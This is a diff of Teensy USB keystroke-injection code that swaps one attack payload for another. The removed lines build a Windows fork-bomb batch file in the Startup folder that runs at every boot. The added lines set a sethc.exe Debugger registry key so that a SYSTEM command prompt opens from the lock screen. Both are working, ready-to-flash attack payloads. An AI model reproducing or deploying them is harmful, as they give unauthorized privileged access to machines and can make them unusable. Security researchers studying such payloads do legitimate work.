@@ -2,19 +2,15 @@
 
 Teensy ( https://www.pjrc.com/teensy/ )
 
-Payload: windows-forkbomb
+Payload: windows-logon-cmd
 
-Disclaimer: Use at own risk, the functions used in this program will render your machine virtually useless.
+Description: Opens a command prompt as administrator with run, adds a few registry entries and allows access to cmd on the lockscreen.
 
-Description: Opens a command prompt as administrator with run, uses con copy to create fork bomb batch.
-
-Then save as .bat file under the startup folder and runs every startup.
-
-You can optionally choose to avoid executing the fork bomb after writing the batch file.
+Press Right Alt + Right Shift + Print Screen to access cmd on the lockscreen.
 
 Using US Keyboard Layout. Modify delays depending on the target machine. Tested Windows 7 and Windows 10.
 
-Concept: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---fork-bomb, https://forums.hak5.org/index.php?/topic/39367-mr-robot-hack-optimized-payload/&do=findComment&comment=282928
+Concept: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Attacking-Windows-At-The-Logon-Screen,---Gaining-Access-To-CMD-With-System-Privileges.
 
 Created by Kleo Bercero - @kbeflo - kbeflo@gmail.com
 
@@ -64,56 +60,19 @@ void setup() {
   Keyboard.set_key1(0);
   Keyboard.send_now();
   delay(2000);
-  // Change directory to startup programs
-  Keyboard.print("cd %UserProfile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
+  Keyboard.print("cmd /c \"reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f\"");
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
   Keyboard.set_modifier(0);
   Keyboard.set_key1(0);
   Keyboard.send_now();
   delay(500);
-  // Write fork bomb batch file
-  Keyboard.print("copy con 6rgl4ljf4m.bat");
-  Keyboard.set_key1(KEY_ENTER);
-  Keyboard.send_now();
-  Keyboard.print("@echo off");
-  Keyboard.set_key1(KEY_ENTER);
-  Keyboard.send_now();
-  Keyboard.print(":START");
-  Keyboard.set_key1(KEY_ENTER);
-  Keyboard.send_now();
-  Keyboard.print("start \"%UserProfile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\6rgl4ljf4m.bat\"");
-  Keyboard.set_key1(KEY_ENTER);
-  Keyboard.send_now();
-  Keyboard.print("GOTO START");
+  Keyboard.print("exit");
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
   Keyboard.set_modifier(0);
   Keyboard.set_key1(0);
   Keyboard.send_now();
-  delay(500);
-  Keyboard.set_modifier(MODIFIERKEY_CTRL);
-  Keyboard.set_key1(KEY_Z);
-  Keyboard.send_now();
-  Keyboard.set_modifier(0);
-  Keyboard.set_key1(0);
-  Keyboard.send_now();
-  delay(500);
-  // End of file
-  Keyboard.set_key1(KEY_ENTER);
-  Keyboard.send_now();
-  Keyboard.set_modifier(0);
-  Keyboard.set_key1(0);
-  Keyboard.send_now();
-  delay(500);
-  // Optional: Comment block to avoid executing fork bomb, making it dormant until the next and every startup.
-  Keyboard.print("6rgl4ljf4m.bat");
-  Keyboard.set_key1(KEY_ENTER);
-  Keyboard.send_now();
-  Keyboard.set_modifier(0);
-  Keyboard.set_key1(0);
-  Keyboard.send_now();
-  delay(500);
 
 }
 
